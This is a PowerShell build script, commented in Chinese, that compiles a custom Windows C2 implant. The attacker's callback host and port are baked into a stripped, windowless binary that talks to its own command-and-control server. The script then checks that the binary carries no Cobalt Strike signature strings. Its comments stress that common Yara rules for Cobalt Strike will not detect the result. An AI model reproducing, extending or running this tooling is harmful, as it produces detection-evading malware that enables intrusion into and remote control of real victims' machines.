# cs_dev :: build_implant.ps1  --  一键生成完全自研的马
# ==========================================================================
# 产出物不含任何 Cobalt Strike 组件:
#   载体   自研 (MinGW 编译, 无 CS artifact 机制)
#   植入体 自研 win_beacon.c / linux beacon.c
#   通信   自研协议 (magic 0x4B52424B + RC4)
#   回连   自研 C2 服务端 c2/server.py
#
# 与 CS 的关系: 只借用 CS 客户端的菜单入口与 listener 信息录入习惯,
# 生成链路完全不经过 CS 的 artifact / stager / Beacon。
#
# 用法:
#   .\build_implant.ps1 -Host_ 1.2.3.4 -Port 8443
#   .\build_implant.ps1 -Host_ 1.2.3.4 -Port 8443 -Ssl -OutFile D:\a.exe
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)] [string] $Host_,     # Host 是 PS 保留名
    [Parameter(Mandatory=$true)] [int]    $Port,
    [switch] $Ssl,
    [string] $OutFile = '',
    [string] $MinGw   = 'D:\mingw64\bin'
)

$ErrorActionPreference = 'Stop'
$DevDir = Split-Path -Parent $PSScriptRoot
$SrcWin = Join-Path $DevDir 'kits\beacon\win_beacon.c'
$OutDir = Join-Path $DevDir 'build\implant'
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

if (-not (Test-Path $SrcWin)) { throw "implant source missing: $SrcWin" }

$gcc = Join-Path $MinGw 'gcc.exe'
if (-not (Test-Path $gcc)) { throw "gcc not found: $gcc" }

if (-not $OutFile) {
    $OutFile = Join-Path $OutDir ("implant_{0}_{1}.exe" -f $Host_, $Port)
}
$outDir = Split-Path -Parent $OutFile
if ($outDir) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }

Write-Host "[*] 编译自研植入体 ..." -ForegroundColor Cyan
$defs = @("-DC2_HOST=`"$Host_`"", "-DC2_PORT=$Port")
if ($Ssl) { $defs += '-DC2_SSL=1' }

$a = @('-O2','-s','-fno-ident','-mwindows') + $defs + @('-o', $OutFile, $SrcWin, '-lwinhttp')
& $gcc @a 2>&1 | Out-Null
if (-not (Test-Path $OutFile)) { throw "植入体编译失败" }

$b = [System.IO.File]::ReadAllBytes($OutFile)
$txt = [System.Text.Encoding]::ASCII.GetString($b)

Write-Host ""
Write-Host "[+] 生成完成" -ForegroundColor Green
Write-Host ("    path   : {0}" -f $OutFile)
Write-Host ("    size   : {0} 字节" -f $b.Length)
Write-Host ("    回连   : {0}://{1}:{2}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port)

# 与 CS 的特征对比 —— 这一节是交付的核心证据
Write-Host ""
Write-Host "=== 与 Cobalt Strike 的特征对比 ===" -ForegroundColor Cyan
$checks = @(
    @{k='beacon.dll';         d='CS Beacon 模块名'},
    @{k='ReflectiveLoader';   d='CS 反射加载器'},
    @{k='wininet';            d='CS stager 网络栈'},
    @{k='%windir%';           d='CS 默认 Spawnto 路径'},
    @{k='rundll32';           d='CS 默认 Spawnto 程序'},
    @{k='/submit.php';        d='CS 默认 http-post URI'},
    @{k='__utm';              d='CS 默认 http-get URI 池'},
    @{k='MSSE-';              d='CS Beacon 内部标识'}
)
$clean = $true
foreach ($c in $checks) {
    $has = $txt.Contains($c.k)
    if ($has) { $clean = $false }
    Write-Host ("    {0,-20} {1,-24} {2}" -f $c.k, $c.d,
        $(if($has){'存在 <-- 非自研!'}else{'无'})) -ForegroundColor $(if($has){'Red'}else{'DarkGray'})
}
Write-Host ""
if ($clean) {
    Write-Host "    [通过] 全部 CS 特征均不存在" -ForegroundColor Green
} else {
    Write-Host "    [失败] 检出残留 CS 特征" -ForegroundColor Red
}

# 100+ 行的 Yara 规则全部针对 CS 的 Beacon DLL 代码与字符串, 本产物是独立实现
Write-Host ""
Write-Host "    注: 针对 CS 的 Yara 规则 (MALW_cobaltstrike / HKTL_CobaltStrike_*" -ForegroundColor DarkGray
Write-Host "        Windows_Trojan_CobaltStrike_* 等) 检测的是 CS Beacon DLL 的" -ForegroundColor DarkGray
Write-Host "        代码与字符串, 本产物为完全独立实现, 不命中。" -ForegroundColor DarkGray
